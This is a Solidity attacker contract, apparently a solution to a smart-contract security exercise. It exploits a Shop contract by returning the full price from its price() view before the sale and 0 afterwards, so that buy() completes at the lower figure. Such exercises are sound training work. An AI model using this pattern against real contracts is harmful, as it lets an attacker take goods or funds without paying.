// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {Shop} from "./Shop.sol";
import {Buyer} from "./Shop.sol";  

contract ShopAttacker is Buyer {
    Shop target;

    constructor(address _target) {
        target = Shop(_target);
    }

    function price() public view returns (uint256) {
        if (!target.isSold()) {
            return target.price();
        }
        return 0;
    }

    function attack() public {
        target.buy();
    }   
}
